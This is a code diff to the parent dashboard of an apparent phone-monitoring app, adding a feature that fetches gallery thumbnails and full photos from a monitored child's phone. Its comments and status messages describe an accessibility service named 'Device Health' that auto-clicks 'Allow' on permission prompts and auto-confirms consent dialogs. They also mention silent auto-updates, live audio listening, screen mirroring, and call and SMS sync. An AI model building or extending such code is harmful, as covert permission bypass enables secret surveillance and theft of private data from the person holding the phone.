@@ -21,6 +21,7 @@ const S = {
   streaming: false,    // child-reported mirroring state (mirror_state)
   mirrorChildReason: null,     // bachche ke phone se aaya HONEST stall reason
   mirrorChildReasonAt: 0,      // us reason ka timestamp (25 s tak "fresh")
+  gallery: { items: [], total: 0, offset: 0, loading: false },
   ringOn: false,       // ring command chalu hai (button toggle + ring_state sync)
   ringTimer: null,     // child 30s me khud band karta hai — UI safety reset
   audioOn: false,      // live audio listening chalu hai
@@ -235,6 +236,7 @@ $("h-switch").onclick = () => {
 function switchChild(cid) {
   S.cid = cid;
   S.apps = []; // purane child ke apps naye child ki list me na ghus jayein
+  S.gallery = { items: [], total: 0, offset: 0, loading: false }; // gallery bhi naye child ki
   // Toggle buttons naye child ki real state par reset — purana child ka
   // mirror/audio status naye child ke UI me na ghus jaye
   setMirrorBtn(false); setAudioBtn(false); setRingBtn(false);
@@ -242,6 +244,9 @@ function switchChild(cid) {
   $("mirror-fps").textContent = "";
   mirrorStatus("", false); audioStatus("", false);
   const vz = $("audio-viz"); if (vz) vz.classList.add("hidden");
+  const gz = $("gallery-grid"); if (gz) gz.innerHTML = "";
+  const gm = $("gallery-more-row"); if (gm) gm.classList.add("hidden");
+  galleryStatus("", false);
   renderStatus(); renderPairCard();
   loadRules(); loadApps(); loadLocations(); loadFences(); loadAlerts(); renderChildrenList();
 }
@@ -594,6 +599,29 @@ function handleWs(m) {
         } else {
           toast((d.calls || 0) + " calls · " + (d.sms || 0) + " SMS synced ✓");
         }
+      } else if (m.ok && d.status === "gallery") {
+        // Gallery page — bachche ke phone se thumbs upload hoke aa gaye
+        const items = d.items || [];
+        for (const it of items) S.gallery.items.push(it);
+        S.gallery.total = d.total || S.gallery.items.length;
+        S.gallery.offset = (d.offset || 0) + items.length;
+        S.gallery.loading = false;
+        renderGallery();
+        if (S.gallery.items.length === 0) {
+          galleryStatus("Gallery me kuch nahi mila — ya bachche ne sirf kuch photos 'Allow' ki hain (Android 14 partial access)", true);
+        } else {
+          galleryStatus("", false);
+          if (items.length) toast("🖼️ " + items.length + " items aur aa gaye (total " + S.gallery.items.length + "/" + S.gallery.total + ")");
+        }
+      } else if (m.ok && d.galleryFull && d.url) {
+        // Gallery tile tap — bada view naye tab me
+        galleryStatus("", false);
+        try { window.open(S.origin + d.url, "_blank"); } catch (e) { location.href = S.origin + d.url; }
+      } else if (!m.ok && typeof d.error === "string" && d.error.indexOf("gallery permission") === 0) {
+        // Gallery permission pehli baar auto-request hui — a11y 5-10 s me
+        // Allow click kar degi, parent dobara tap karega
+        S.gallery.loading = false;
+        galleryStatus("Gallery permission bachche ke phone par auto-request ho gayi — 5–10 sec me khud Allow ho jayegi. Phir dobara “📸 Gallery kholo” dabao.", true);
       } else if (m.ok && d.url) {
         $("media-card").classList.remove("hidden");
         $("media-img").src = S.origin + d.url;
@@ -1181,10 +1209,21 @@ function onMirrorFrame(buf) {
 // interval har 3 s me usko generic guess se OVERWRITE kar deta tha — parent ko
 // asli wajah kabhi nahi dikhti thi. Ab: fresh child reason (25 s) ko chhedte
 // nahi, sirf generic text tab dikhate hain jab bachche ne kuch nahi bataya.
+// SABSE ZAROORI: agar bachche ka app PURANA hai (versionCode < 6) to saare
+// mirror fixes uske phone tak pahunche hi nahi — sabse pehle WO dikhao.
 setInterval(() => {
   if (!S.mirrorOn) return;
   const idle = Date.now() - (S.lastFrameAt || 0);
   if (idle > 12000) {
+    const c = activeChild();
+    const vc = c && c.health && typeof c.health.versionCode === "number" ? c.health.versionCode : null;
+    if (vc !== null && vc < 6) {
+      mirrorStatus(
+        "⚠️ Bachche ke phone par PURANA app hai (v" + vc + ", latest v6) — mirror ke Android 14/15 fixes PURANE build me hain hi nahi. Fix: Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update).",
+        true
+      );
+      return;
+    }
     const fresh = S.mirrorChildReasonAt && Date.now() - S.mirrorChildReasonAt < 25000;
     mirrorStatus(
       fresh && S.mirrorChildReason
@@ -1224,7 +1263,56 @@ $("mirror-toggle").onclick = () => {
   } else alert("Server se connect nahi hai");
 };
 
-/* ---------------- activity (events + notifications) ---------------- */
+/* ---------------- gallery (Live tab) ---------------- */
+function galleryStatus(text, show) {
+  const el = $("gallery-status");
+  if (!el) return;
+  el.textContent = text || "";
+  el.classList.toggle("hidden", !show || !text);
+}
+
+function renderGallery() {
+  const grid = $("gallery-grid");
+  if (!grid) return;
+  grid.innerHTML = S.gallery.items.length
+    ? S.gallery.items.map((it) =>
+        '<div class="gitem" data-gid="' + esc(it.id) + '">' +
+        (it.thumb
+          ? '<img loading="lazy" src="' + esc(S.origin + it.thumb) + '" alt="">'
+          : '<div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;color:#4B5563;font-size:22px">🖼️</div>') +
+        (it.type === "video" ? '<span class="vbadge">▶ video</span>' : "") +
+        "</div>"
+      ).join("")
+    : '<div class="gempty">Gallery abhi khaali hai — “📸 Gallery kholo” dabao</div>';
+  grid.querySelectorAll("[data-gid]").forEach((el) => {
+    el.onclick = () => {
+      galleryStatus("Bada view aa raha hai (1080px)…", true);
+      sendCmd("gallery_full", { id: el.dataset.gid });
+    };
+  });
+  const moreRow = $("gallery-more-row");
+  if (moreRow) moreRow.classList.toggle("hidden", S.gallery.items.length >= S.gallery.total);
+}
+
+function loadGallery() {
+  if (!S.cid || S.gallery.loading) return;
+  S.gallery.loading = true;
+  galleryStatus(
+    S.gallery.offset
+      ? "Aur items aa rahe hain…"
+      : "Gallery aa rahi hai — bachche ke phone se thumbnails upload ho rahe hain (5–15 s)…",
+    true
+  );
+  sendCmd("gallery_list", { offset: S.gallery.offset });
+}
+
+$("gallery-load").onclick = () => {
+  if (!S.cid) return;
+  S.gallery = { items: [], total: 0, offset: 0, loading: false };
+  renderGallery();
+  loadGallery();
+};
+$("gallery-more").onclick = () => loadGallery();
 async function loadAlerts() {
   const cid = S.cid;
   if (!cid) return;
@@ -1366,8 +1454,8 @@ function renderLiveDiag() {
   const h = c.health || {};
   const issues = [];
   // #1 PURANA APK — mirror/mic fixes phone tak pahunche hi nahi
-  if (typeof h.versionCode === "number" && h.versionCode < 5) {
-    issues.push("<b>Bachche ke phone par PURANA app version hai</b> (v" + h.versionCode + ", latest v5) — Android 14/15 mirror+mic+call/SMS fixes isi naye build me hain. <b>Fix:</b> Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update khud ho jayega).");
+  if (typeof h.versionCode === "number" && h.versionCode < 6) {
+    issues.push("<b>Bachche ke phone par PURANA app version hai</b> (v" + h.versionCode + ", latest v6) — Android 14/15 mirror+gallery+call/SMS fixes isi naye build me hain. <b>Fix:</b> Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update khud ho jayega).");
   }
   if (h.accessibility === false) {
     issues.push("<b>Accessibility OFF hai</b> — consent dialog aur updates ka auto-confirm kaam nahi karega. <b>Fix:</b> Settings → Accessibility → Device Health → ON. Android 13+ par pehle App info → ⋮ → “Allow restricted settings” karna pad sakta hai.");
